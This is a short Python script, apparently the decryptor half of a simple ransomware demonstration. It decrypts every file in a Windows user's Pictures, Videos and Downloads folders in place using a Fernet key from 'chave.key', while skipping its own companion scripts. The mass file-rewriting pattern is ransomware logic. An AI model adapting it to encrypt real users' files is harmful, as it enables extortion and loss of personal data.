import os
from cryptography.fernet import Fernet

with open('chave.key', 'rb') as chave:
    chave_secreta = chave.read()

username = os.getenv('USERNAME')
folders = [
    os.path.join(fr"C:\Users\{username}\OneDrive\Imagens"),
    os.path.join(fr"C:\Users\{username}\Videos"),
    os.path.join(fr"C:\Users\{username}\Downloads")
]

arquivos = []

for folder in folders:
    for root, dirs, files in os.walk(folder):
        for file in files:
            if file in ['01main.py', 'chave.key', '02main.py','desktop.ini']:
                continue

            file_path = os.path.join(root, file)
            arquivos.append(file_path)
            
for arquivo in arquivos:
    with open(arquivo, 'rb') as file:
        conteudo = file.read()

        conteudo_descriptografado = Fernet(chave_secreta).decrypt(conteudo)

        with open(arquivo, 'wb') as file:
            file.write(conteudo_descriptografado)
# print(arquivos)